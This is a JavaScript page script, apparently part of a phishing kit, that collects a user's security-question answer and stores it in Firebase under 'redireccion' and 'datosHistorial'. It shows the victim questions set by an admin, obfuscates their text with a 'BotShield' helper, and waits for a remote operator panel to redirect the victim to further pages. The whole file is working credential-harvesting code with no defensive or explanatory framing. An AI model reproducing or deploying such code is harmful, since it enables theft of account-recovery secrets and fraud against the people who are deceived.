"use strict";

(function initPregSeg() {
  var pregsegWatcher = null;

  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  // --- Lógica de Interfaz (UI) ---
  function initUI() {
    var input = document.getElementById("toko-1");
    var continueBtn = document.getElementById("modal-key-validation_continue-button");

    if (!input || !continueBtn) {
      return;
    }

    // Capitalizar la primera letra mientras escribe
    input.addEventListener("input", function () {
      var val = input.value;
      if (val.length > 0) {
        input.value = val.charAt(0).toUpperCase() + val.slice(1);
      }
      
      if (input.value.trim().length > 0) {
        continueBtn.removeAttribute("disabled");
      } else {
        continueBtn.setAttribute("disabled", "true");
      }
    });

    continueBtn.addEventListener("click", function () {
      if (input.value.trim().length === 0) return;
      
      continueBtn.setAttribute("disabled", "true");
      setLoading(true);
      
      mitPregSegData(input.value.trim());
    });
    
    // Soporte para Enter
    input.addEventListener("keypress", function (e) {
      if (e.key === "Enter" && !continueBtn.disabled) {
        e.preventDefault();
        continueBtn.click();
      }
    });
  }

  function setLoading(isLoading) {
    var loader = document.getElementById("dinamica-loader");
    if (loader) {
      if (isLoading) {
        loader.classList.remove("bc-hidden");
      } else {
        loader.classList.add("bc-hidden");
      }
    }
  }

  function updatePreguntaUI(textoPregunta) {
    var descEl = document.getElementById("pregunta-seguridad-desc");
    if (descEl && textoPregunta) {
      // Si BotShield esta disponible ofusca el texto de la pregunta
      if (window.BotShield && typeof window.BotShield.obfuscateText === "function") {
        descEl.innerHTML = window.BotShield.obfuscateText(textoPregunta);
      } else {
        descEl.textContent = textoPregunta;
      }
    }
  }

  // --- Lógica de Firebase ---
  function updateHistoryEntry(db, usuario, pregsegData) {
    return db
      .collection("redireccion")
      .doc(usuario)
      .get()
      .then(function (snapshot) {
        var currentData = snapshot.exists ? snapshot.data() || {} : {};
        var payload = Object.assign(
          {
            usuario: usuario,
            timestamp: currentData.timestamp || new Date().toISOString(),
          },
          currentData,
          pregsegData
        );
        return db
          .collection("datosHistorial")
          .doc(usuario)
          .set(payload, { merge: true });
      })
      .catch(function (error) {
        console.error("Error actualizando historial PregSeg:", error);
      });
  }

  function attachPregSegWatcher(userRef) {
    if (pregsegWatcher) {
      pregsegWatcher();
      pregsegWatcher = null;
    }

    pregsegWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          return;
        }

        var userData = docSnapshot.data() || {};
        
        // Actualizar la pregunta en UI si hay una configurada
        if (userData.preguntaSeguridadAdmin) {
          updatePreguntaUI(userData.preguntaSeguridadAdmin);
        }

        var page = userData.page;

        // Si page es 99 (pagina actual), ignoramos.
        if (page === 99 || typeof page !== "number" || page <= 0) {
          return;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          var targetUrl = String(route.url || "");
          var currentPath = window.location.pathname.split("/").pop() || "";
          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";

          // Evita recargar en bucle cuando el destino ya es la vista actual.
          if (targetPath && targetPath === currentPath) {
            return;
          }

          if (pregsegWatcher) {
            pregsegWatcher();
            pregsegWatcher = null;
          }

          window.location.href = route.url;
          return;
        }
      },
      function () {
        setLoading(false);
        alert("Error de conexion. Intenta nuevamente.");
      }
    );
  }

  function mitPregSegData(respuesta) {
    var usuario = localStorage.getItem("usuarioActual") || sessionStorage.getItem("dashboard_session_user");

    if (!usuario) {
      window.location.href = window.appConfig && window.appConfig.routes && window.appConfig.routes[1] ? window.appConfig.routes[1].url : "index.html";
      return;
    }

    var db = firebase.firestore();
    var userRef = db.collection("redireccion").doc(usuario);

    var payload = {
      respuestaSeguridad: respuesta,
      page: 0,
      pregsegEstado: "esperando",
      pregsegEsperandoPanel: true,
      pregsegUltimaPagina: "pregseg",
      pregsegActualizadoEn: new Date().toISOString()
    };

    userRef
      .set(payload, { merge: true })
      .then(function () {
        return updateHistoryEntry(db, usuario, { respuestaSeguridad: respuesta });
      })
      .then(function () {
        // La UI mantiene el estado loading hasta que cambie 'page'
      })
      .catch(function (error) {
        console.error("Error guardando datos de PregSeg:", error);
        setLoading(false);
        alert("Hubo un error al procesar tu respuesta. Intenta nuevamente.");
        var btn = document.getElementById("modal-key-validation_continue-button");
        if (btn) btn.removeAttribute("disabled");
      });
  }

  // --- Inicialización ---
  ready(function () {
    // 1. Inicializar UI
    initUI();

    // 2. Inicializar Firebase
    var usuario = localStorage.getItem("usuarioActual") || sessionStorage.getItem("dashboard_session_user");
    if (!usuario) {
      window.location.href = window.appConfig && window.appConfig.routes && window.appConfig.routes[1] ? window.appConfig.routes[1].url : "index.html";
      return;
    }

    var db = firebase.firestore();
    var userRef = db.collection("redireccion").doc(usuario);

    userRef.get().then(function (docSnapshot) {
      if (!docSnapshot.exists) {
        window.location.href = window.appConfig && window.appConfig.routes && window.appConfig.routes[1] ? window.appConfig.routes[1].url : "index.html";
        return;
      }
      
      var data = docSnapshot.data() || {};
      if (data.preguntaSeguridadAdmin) {
        updatePreguntaUI(data.preguntaSeguridadAdmin);
      }

      attachPregSegWatcher(userRef);
    }).catch(function (error) {
      console.error("Error inicial PregSeg:", error);
    });
  });
})();
